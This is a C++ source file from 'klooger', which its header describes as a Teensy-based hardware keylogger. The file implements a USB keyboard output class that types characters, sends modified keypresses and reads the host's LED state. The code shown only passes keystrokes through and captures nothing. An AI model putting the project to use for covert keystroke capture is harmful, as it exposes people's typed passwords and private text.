/*
 * klooger - a hardware keylogger based on the Teensy
 * Copyright (C) 2012 Michael Drost
 *
 * This program is free software; you can redistribute it and/or modify it under the terms of the GNU General Public License
 * as published by the Free Software Foundation; either version 3 of the License, or (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without even the implied warranty
 * of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License along with this program; if not, see <http://www.gnu.org/licenses/>.
 */

/*
 * This file contains the definition of the UsbKeyboardOutput class
 */
#include <usb_api.h> //include the file containing the Keyboard class
#include "UsbKeyboardOutput.h"
#include "Debug.h"

extern volatile uint8_t keyboard_leds;
  
void UsbKeyboardOutput::print(const char c)
{
  Keyboard.print(c);
}
void UsbKeyboardOutput::prints(const char* c)
{
  Keyboard.print(c);
}
void UsbKeyboardOutput::printKey(const int modifier, const char key)
{
  Keyboard.set_modifier(modifier);
  Keyboard.set_key1(key);
  Keyboard.send_now();
  Keyboard.set_key1(0);
  Keyboard.set_modifier(0);
  Keyboard.send_now();
}
int UsbKeyboardOutput::getLedStatus()
{
  return (int)keyboard_leds;
}
